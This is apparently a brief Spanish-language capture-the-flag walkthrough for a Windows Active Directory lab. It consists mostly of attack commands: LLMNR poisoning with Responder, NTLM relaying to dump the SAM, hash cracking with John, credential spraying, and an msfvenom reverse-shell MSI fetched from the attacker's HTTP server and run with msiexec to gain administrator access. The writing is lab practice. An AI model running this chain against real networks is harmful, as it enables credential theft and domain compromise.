User.txt


nano /etc/responder/responder.conf -> Smb y http a Off -> Acordarse de ponerlo luego en On para otros ataques.
crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt y dominio
sudo responder -I vboxnet0 -dw
    ntlmrelayx.py -tf ips.txt -smb2support
y espero a obtener la SAM 
john hash --format=NT --show
john -w pass.txt hash --format=NT

verificar credenciales:
crackmapexec smb 192.168.56.0/24 -u "name" -p "pass"

rdesktop -u 'user@domain' -p 'pass' IP -> El domain es genwin.local, lo sabemos porque lo hemos visto en el comando crackmapexec.

Root.txt

Una vez dentro, vemos los usuarios locales:
net user y vemos que hay uno con nuestro mismo nombre, intentamos hacer un runas con las misma credenciales:
runas /user:username powershell 

msfvenom -p windows/x64/powershell_reverse_tcp -ax64 LHOST=IP LPORT=PORT -f msi > cmd.msi

python3 -m http.server

nc -lvp PORT

msiexec.exe /q /i http://IP/cmd.msi


Ahora que somos admin, vamos al esritorio del administrador y vemos su contraseña en uno de los archivos. 

Ahora ya podemos conectarnos al DC como administrador.

